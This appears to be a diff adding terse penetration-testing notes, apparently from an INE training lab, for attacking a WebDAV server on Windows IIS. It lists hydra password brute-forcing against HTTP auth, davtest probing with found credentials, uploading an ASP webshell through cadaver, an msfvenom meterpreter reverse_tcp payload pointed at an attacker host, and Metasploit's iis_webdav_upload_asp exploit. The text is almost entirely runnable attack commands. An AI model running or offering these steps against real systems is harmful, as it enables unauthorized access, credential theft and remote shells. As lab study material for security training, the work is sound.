@@ -1,0 +1,37 @@
+searchsploit "Apache Tomcat" | grep -e "Metasploit"
+
+
+WebDAV
+
+nmap -sV -p 80 --script=http-enum <ip>
+hydra -L /usr/share/wordlists/metasploit/common_users.txt -P/usr/share/wordlists/metasploit/common_passwords.txt 192.168.100.55 http-get /webdav/
+hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get / 
+
+nmap --script http-enum -sV -p 80 192.168.100.55
+davtest -url http://192.168.100.55/webdav
+davtest -auth bob:password_123321 -url http://192.168.100.55/webdav
+cadaver http://192.168.100.55/webdav
+username:
+password:
+ls -la /usr/share/webshells
+ls -la /usr/share/webshells/asp/
+
+put /usr/share/webshells/asp/webshell.asp
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=1234 -f asp > meterpreter.asp
+cadaver http://192.168.100.55/webdav
+username:
+password:
+put /usr/share/webshells/asp/meterpreterasp
+exploit/multi/handler
+
+
+use exploit/windows/iis/iis_webdav_upload_asp
+set RHOSTS demo.ine.local
+set HttpUsername bob
+set HttpPassword password_123321
+set PATH /webdav/metasploit%RAND%.asp
+exploit
+
+
